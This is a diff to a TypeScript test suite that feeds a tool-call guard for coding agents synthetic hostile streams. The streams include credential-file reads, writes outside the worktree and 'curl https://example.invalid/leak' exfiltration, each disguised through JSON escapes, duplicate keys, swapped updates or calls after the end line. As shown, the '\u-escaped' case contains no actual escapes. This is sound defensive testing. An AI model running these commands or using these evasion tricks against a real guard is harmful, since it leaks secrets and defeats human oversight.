@@ -36,6 +36,10 @@
  *   hostile one, a hostile call swapped back to a benign command, and exit codes 2 and 137;
  * - a hostile call before `end` followed, after `end`, by an unreadable or a repeated `tool_call_update` (which the
  *   parser does not count as a call after `end`), at exit 0 and exit 1;
+ * - JSON encodings the parser sees only after `JSON.parse` (`\u` escapes in type, key and command, a duplicate
+ *   command key whose last value is the Git write, CRLF line endings), hypothetical `stopReason` values `max_tokens`
+ *   and `refusal`, a path-only call given a command on the same id, and swapped-in-update and after-`end` calls at
+ *   exit 2 and 137;
  * - prototype-named, near-miss, non-string, unreadable text/end, non-object-input, empty-name and live-bare
  *   `tool_call` lines in `unknown_events`, at exit 0, 1 and 2.
  *
@@ -1938,6 +1942,135 @@ const grokCase: AdapterLegCase = {
               input: { command },
             }),
           ],
+        },
+      ]);
+    }),
+
+    // -------------------------------------------------------------------------
+    // 13b. JSON encodings, further stop reasons, a target upgraded to a command, and swapped or trailing calls at
+    //     exit 2 and 137 (synthetic; parser unchanged)
+    // -------------------------------------------------------------------------
+    // Valid JSON the parser sees only after `JSON.parse`: `\u` escapes in the event type, the key and the command, a
+    // duplicate key whose last value is the hostile one (last wins), and CRLF line endings. Each is the same call to
+    // the guard as the plain line.
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+      const command =
+        category === "credential_read"
+          ? `cat ${fx.claudeCredentialsPath} && git push origin main`
+          : category === "out_of_worktree_write"
+            ? `touch ${fx.outsideSentinel} && git push origin main`
+            : "curl https://example.invalid/leak && git push origin main";
+      const escaped =
+        String.raw`{"type":"tool_call","tool":"run_terminal_command","input":{"command":` +
+        JSON.stringify(command).replace("git push", String.raw`git push`) +
+        "}}";
+      const duplicate = `{"type":"tool_call","tool":"run_terminal_command","input":{"command":"ls","command":${JSON.stringify(command)}}}`;
+      return [0, 1].flatMap((exitCode): HostileStream[] => [
+        {
+          name: `${category} with \\u-escaped type, key and Git write, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [META(`${category}: \\u-escaped tool_call, exit ${exitCode}`, exitCode), TOOLS, escaped, end()],
+        },
+        {
+          name: `${category} with a duplicate command key whose last value is the Git write, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [META(`${category}: duplicate command key, exit ${exitCode}`, exitCode), TOOLS, duplicate, end()],
+        },
+        {
+          name: `${category} with a Git write on CRLF-terminated lines, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: CRLF-terminated lines, exit ${exitCode}`, exitCode),
+            `${TOOLS}\r`,
+            `${toolCall(command)}\r`,
+            `${end()}\r`,
+          ],
+        },
+      ]);
+    }),
+    // A `stopReason` other than `end_turn` or `cancelled` (hypothetical values; the live check recorded only those
+    // two) is TOOL_FAILURE at exit 0 without the guard; the guard verdict outranks it.
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) =>
+      ["max_tokens", "refusal"].map(
+        (stopReason): HostileStream => ({
+          name: `${category} with a Git write, then an end line with stopReason ${stopReason}`,
+          category,
+          exitCode: 0,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: stopReason ${stopReason}`, 0),
+            TOOLS,
+            toolCall(
+              category === "credential_read"
+                ? `cat ${fx.codexAuthPath} && git commit --allow-empty -m x`
+                : category === "out_of_worktree_write"
+                  ? `touch ${fx.outsideSentinel} && git commit --allow-empty -m x`
+                  : "curl https://example.invalid/leak && git commit --allow-empty -m x",
+            ),
+            end(stopReason),
+          ],
+        }),
+      ),
+    ),
+    // A call first reported with only a path (a `read`) and then, on the same id, given a command: the new parameter
+    // key is reported to the guard. Without the guard the exit 0 stream ends `ok: true`.
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+      const command =
+        category === "credential_read"
+          ? `cat ${fx.claudeCredentialsPath} && git push origin main`
+          : category === "out_of_worktree_write"
+            ? `touch ${fx.outsideSentinel} && git push origin main`
+            : "curl https://example.invalid/leak && git push origin main";
+      return [0, 1].map(
+        (exitCode): HostileStream => ({
+          name: `${category}: a path-only call given a Git-write command in tool_call_update, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: path-only call upgraded to a command, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "tool_call", id: "call_p", tool: "read_file", input: { path: "README.md" } }),
+            JSON.stringify({ type: "tool_call_update", id: "call_p", tool: "read_file", input: { command } }),
+            end(),
+          ],
+        }),
+      );
+    }),
+    // Exit codes 2 and 137 for the swapped-in-update and after-`end` shapes (section 13 covers the plain call).
+    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+      const command =
+        category === "credential_read"
+          ? `cat ${fx.codexAuthPath} && git push origin main`
+          : category === "out_of_worktree_write"
+            ? `touch ${fx.outsideSentinel} && git push origin main`
+            : "curl https://example.invalid/leak && git push origin main";
+      return [2, 137].flatMap((exitCode): HostileStream[] => [
+        {
+          name: `${category}: a benign call swapped to a Git write in tool_call_update, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [
+            META(`${category}: swapped in tool_call_update, exit ${exitCode}`, exitCode),
+            TOOLS,
+            JSON.stringify({ type: "tool_call", id: "call_s", tool: "run_terminal_command", input: { command: "ls" } }),
+            JSON.stringify({ type: "tool_call_update", id: "call_s", status: "in_progress", input: { command } }),
+            ...(exitCode === 2 ? [end()] : []),
+          ],
+        },
+        {
+          name: `${category}: a Git write after the end line, exit ${exitCode}`,
+          category,
+          exitCode,
+          failureCode: "PERMISSION_BLOCKED",
+          lines: [META(`${category}: after the end line, exit ${exitCode}`, exitCode), TOOLS, end(), toolCall(command)],
         },
       ]);
     }),
